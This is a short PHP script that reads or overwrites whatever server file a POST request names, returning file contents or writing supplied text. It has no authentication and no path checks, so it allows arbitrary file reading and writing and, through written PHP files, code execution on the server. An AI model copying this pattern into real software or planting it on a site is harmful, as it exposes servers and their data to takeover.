 <?php
//Credit: m_zolfo

if($_POST["fn"] == "read" && $_POST["filename"] !="")
{
	$myfile = fopen($_POST["filename"], "r") or die(""); //echo "";return;
	echo fread($myfile,filesize($_POST["filename"]));
	fclose($myfile);
}

if($_POST["fn"] == "save" && /*$_POST["value"] != "" &&*/ $_POST["filename"] !="")
{
	$myfile = fopen($_POST["filename"], "w") or die("");
	fwrite($myfile,$_POST["value"]);
	fclose($myfile);
}
?>
